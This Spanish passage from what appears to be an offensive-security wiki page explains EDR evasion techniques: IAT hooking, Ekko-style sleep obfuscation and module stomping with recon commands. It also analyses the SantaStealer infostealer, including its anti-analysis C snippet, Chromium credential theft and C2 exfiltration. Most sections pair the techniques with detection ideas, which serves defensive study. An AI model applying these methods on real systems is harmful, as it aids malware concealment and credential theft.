- Combínalo con stack cutting y stack stitching techniques para aterrizar dentro de frames esperados antes del prologue de la API.

Integración operativa
- Antepone el reflective loader a los post-ex DLLs para que el PIC y los hooks se inicialicen automáticamente cuando se cargue el DLL.
- Usa un Aggressor script para registrar APIs objetivo, de modo que Beacon y BOFs se beneficien de forma transparente de la misma ruta de evasion sin cambios de código.

Consideraciones de Detection/DFIR
- IAT integrity: entries que resuelven a direcciones non-image (heap/anon); verificación periódica de los import pointers.
- Stack anomalies: return addresses que no pertenecen a loaded images; transiciones abruptas a PIC non-image; ancestry de RtlGetCurrentThreadStart inconsistente.
- Loader telemetry: escrituras in-process en la IAT, actividad temprana de DllMain que modifica import thunks, regiones RX inesperadas creadas al cargar.
- Image-load evasion: si haces hooking de LoadLibrary*, monitoriza cargas sospechosas de automation/clr assemblies correlacionadas con eventos de memory masking.

Bloques de construcción y ejemplos relacionados
- Reflective loaders que hacen IAT patching durante la carga (p. ej., TitanLdr, AceLdr)
- Memory masking hooks (p. ej., simplehook) y PIC de stack-cutting (stackcutting)
- PIC call-stack spoofing stubs (p. ej., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Si controlas un reflective loader, puedes hacer hook de imports **durante** `ProcessImports()` reemplazando el `GetProcAddress` pointer del loader con un custom resolver que compruebe primero los hooks:

- Construye un **resident PICO** (persistent PIC object) que sobreviva después de que el transient loader PIC se libere a sí mismo.
- Exporta una función `setup_hooks()` que sobrescriba el import resolver del loader (p. ej., `funcs.GetProcAddress = _GetProcAddress`).
- En `_GetProcAddress`, salta los ordinal imports y usa una hook lookup basada en hash como `__resolve_hook(ror13hash(name))`. Si existe un hook, devuélvelo; si no, delega al `GetProcAddress` real.
- Registra los hook targets en tiempo de link con entradas de Crystal Palace `addhook "MODULE$Func" "hook"`. El hook sigue siendo válido porque vive dentro del resident PICO.

Esto proporciona **import-time IAT redirection** sin parchear la code section del DLL cargado después de la carga.

### Forcing hookable imports when the target uses PEB-walking

Los import-time hooks solo se activan si la función realmente está en la IAT del target. Si un módulo resuelve APIs mediante un PEB-walk + hash (sin import entry), fuerza un import real para que la ruta `ProcessImports()` del loader lo vea:

- Sustituye la resolución de export basada en hash (p. ej., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) por una referencia directa como `&WaitForSingleObject`.
- El compilador emite una IAT entry, habilitando la interception cuando el reflective loader resuelve imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

En lugar de parchear `Sleep`, haz hook de las **verdaderas wait/IPC primitives** que usa el implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Para esperas largas, envuelve la llamada en una cadena de obfuscation estilo Ekko que encripta la imagen en memoria durante el idle:

- Usa `CreateTimerQueueTimer` para programar una secuencia de callbacks que llamen a `NtContinue` con `CONTEXT` frames construidos.
- Cadena típica (x64): establecer la imagen en `PAGE_READWRITE` → RC4 encrypt mediante `advapi32!SystemFunction032` sobre toda la imagen mapeada → realizar la blocking wait → RC4 decrypt → **restaurar permisos por sección** recorriendo las PE sections → señalar completion.
- `RtlCaptureContext` proporciona una plantilla `CONTEXT`; clónala en múltiples frames y ajusta registros (`Rip/Rcx/Rdx/R8/R9`) para invocar cada paso.

Detalle operativo: devuelve “success” para esperas largas (p. ej., `WAIT_OBJECT_0`) para que el caller continúe mientras la imagen está masked. Este patrón oculta el módulo frente a scanners durante ventanas de idle y evita la clásica firma de “patched `Sleep()`”.

Ideas de detection (basadas en telemetry)
- Ráfagas de callbacks de `CreateTimerQueueTimer` apuntando a `NtContinue`.
- `advapi32!SystemFunction032` usado sobre buffers grandes y contiguos del tamaño de una imagen.
- `VirtualProtect` de gran rango seguido de restauración personalizada de permisos por sección.


## Precision Module Stomping

Module stomping ejecuta payloads desde la **sección `.text` de un DLL ya mapeado dentro del proceso target** en lugar de asignar memoria privada ejecutable obvia o cargar un fresh sacrificial DLL. El target de overwrite debe ser una **loaded, disk-backed image** cuyo espacio de código pueda absorber el payload sin corromper code paths que el proceso aún necesita.

### Reliable target selection

El stomping ingenuo contra módulos comunes como `uxtheme.dll` o `comctl32.dll` es frágil: el DLL puede no estar cargado en el proceso remoto, y una code region demasiado pequeña hará que el proceso crashee. Un workflow más fiable es:

1. Enumera los módulos del proceso target y mantén una **names-only include list** de DLLs ya cargados.
2. Construye primero el payload y registra su **exact byte size**.
3. Escanea DLLs candidatas en disco y compara la PE section **`.text` `Misc_VirtualSize`** con el tamaño del payload. Esto importa más que el file size porque refleja el tamaño de la sección ejecutable **cuando se mapea en memoria**.
4. Parsea la **Export Address Table (EAT)** y elige un exported function RVA como stomp start offset.
5. Calcula el **blast radius**: si el payload supera el boundary de la función seleccionada, sobrescribirá exports adyacentes dispuestos después de ella en memoria.

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Notas operativas
- Prefiere DLLs **ya cargadas** en el proceso remoto para evitar la telemetría de `LoadLibrary`/cargas de imagen inesperadas.
- Prefiere exports que rara vez ejecuta la aplicación objetivo; de lo contrario, las rutas normales de código pueden golpear los bytes stomped antes o después de la creación del thread.
- Los implants grandes a menudo requieren cambiar el embedding de shellcode de un literal de cadena a un **byte-array/braced initializer** para que el buffer completo se represente correctamente en el código fuente del injector.

Ideas de detección
- Escrituras remotas en **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) en lugar de las asignaciones privadas RWX/RX más comunes.
- Puntos de entrada de export cuyo bytes en memoria ya no coinciden con el archivo de respaldo en disco.
- Remote threads o context pivots que comienzan la ejecución dentro de un export legítimo de DLL cuyos primeros bytes fueron modificados recientemente.
- Secuencias sospechosas de `VirtualProtect(Ex)` / `WriteProcessMemory` contra páginas `.text` de DLL seguidas de creación de thread.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ilustra cómo los info-stealers modernos combinan AV bypass, anti-analysis y acceso a credenciales en un único flujo de trabajo.

### Keyboard layout gating & sandbox delay

- Un flag de config (`anti_cis`) enumera los keyboard layouts instalados mediante `GetKeyboardLayoutList`. Si se encuentra un layout cirílico, la muestra deja un marcador vacío `CIS` y termina antes de ejecutar stealers, asegurando que nunca se active en locales excluidos mientras deja un artefacto de hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Lógica por capas `check_antivm`

- La Variante A recorre la lista de procesos, hashea cada nombre con un checksum rodante personalizado y lo compara con blocklists embebidas para debuggers/sandboxes; repite el checksum sobre el nombre del equipo y revisa directorios de trabajo como `C:\analysis`.
- La Variante B inspecciona propiedades del sistema (umbral mínimo de procesos, uptime reciente), llama a `OpenServiceA("VBoxGuest")` para detectar las additions de VirtualBox y realiza comprobaciones de temporización alrededor de sleeps para detectar single-stepping. Cualquier acierto aborta antes de que se lancen los módulos.

### Helper fileless + carga reflectiva doble de ChaCha20

- La DLL/EXE principal incrusta un Chromium credential helper que se suelta en disco o se mapea manualmente en memoria; el modo fileless resuelve imports/relocations por sí mismo para que no se escriban artefactos del helper.
- Ese helper almacena una DLL de segunda etapa cifrada dos veces con ChaCha20 (dos claves de 32 bytes + nonces de 12 bytes). Tras ambos pases, la carga reflectivamente del blob (sin `LoadLibrary`) y llama a exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivados de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Las rutinas de ChromElevator usan reflective process hollowing con direct-syscall para inyectar en un browser Chromium en ejecución, heredar las claves de AppBound Encryption y descifrar passwords/cookies/credit cards directamente desde bases de datos SQLite a pesar del endurecimiento de ABE.


### Recopilación modular en memoria y exfiltración HTTP por chunks

- `create_memory_based_log` itera una tabla global de punteros a funciones `memory_generators` y crea un thread por cada módulo habilitado (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Cada thread escribe resultados en buffers compartidos e informa su conteo de archivos tras una ventana de join de ~45s.
- Una vez finalizado, todo se comprime con la librería `miniz` enlazada estáticamente como `%TEMP%\\Log.zip`. Luego `ThreadPayload1` duerme 15s y transmite el archivo en chunks de 10 MB mediante HTTP POST a `http://<C2>:6767/upload`, suplantando el boundary `multipart/form-data` de un browser (`----WebKitFormBoundary***`). Cada chunk añade `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` opcional, y el último chunk añade `complete: true` para que el C2 sepa que la reassembly ha terminado.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
